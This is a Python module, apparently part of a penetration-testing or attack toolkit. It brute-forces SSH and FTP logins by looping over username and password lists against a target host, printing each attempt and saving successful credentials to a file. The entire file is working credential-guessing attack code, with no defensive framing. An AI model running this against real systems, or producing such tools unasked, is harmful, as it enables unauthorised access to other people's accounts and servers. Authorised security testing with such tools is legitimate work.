import paramiko
import ftplib
import logging
from modules.misc import Colors, save_results


def run_aiur(host, service, usernames, passwords, port=None):
	successful_logins = []

	# Set default port
	if port is None:
		if service == "ssh":
			port = 22
		elif service == "ftp":
			port = 21
	
	try:
		# Iterate through all usernames & passwords
		for username in usernames:
			for password in passwords:
				print(f"{Colors.YELLOW}Trying {username}:{password}{Colors.RESET}")
				if service == "ssh":
					 # Attempt SSH brute-force
					if ssh_brute(host, username, password, port=port):
						successful_logins.append(f"{username}:{password}")
						print(f"\n{Colors.GREEN}Successful login! - {username}:{password}{Colors.RESET}\n")
				elif service == "ftp":
					 # Attempt FTP brute-force
					if ftp_brute(host, username, password, port=port):
						successful_logins.append(f"{username}:{password}")
						print(f"\n{Colors.GREEN}Successful login! - {username}:{password}{Colors.RESET}\n")

	except KeyboardInterrupt:
		# Handle CTRL C
		print(f"\n{Colors.RED}Process interrupted. Saving results...{Colors.RESET}")
		logging.info("Process interrupted by user input")  

	finally:
		# Save successful logins if found
		if successful_logins:
			print(f"{Colors.GREEN}\n[Successful logins]{Colors.RESET}")
			for login in successful_logins:
				print(login)
			print(f"\n{Colors.YELLOW}Results: aiur/creds.txt{Colors.RESET}")
			save_results(successful_logins, "aiur", "creds.txt")
		else:
			print(f"{Colors.RED}No successful logins found{Colors.RESET}")

def ssh_brute(host, username, password, port):
	try:
		# SSH brute-force using Paramiko
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(host, username=username, password=password, port=port, timeout=1)
		client.close()
		logging.info(f"Successful login for {username}:{password}")
		return True

	except paramiko.AuthenticationException:
		logging.info(f"Failed login for {username}:{password}")

	except Exception as e:
		logging.error(f"Unexpected error: {e}")
	return False

def ftp_brute(host, username, password, port):
	try:
		# FTP brute-force using ftplib
		ftp = ftplib.FTP()
		ftp.connect(host, port=port, timeout=1)
		ftp.login(username, password)
		ftp.quit()
		logging.info(f"Successful login for {username}:{password}")
		return True

	except ftplib.error_perm:
		logging.info(f"Failed login for {username}:{password} - permission")

	except Exception as e:
		logging.error(f"Unexpected error: {e}")

	return False
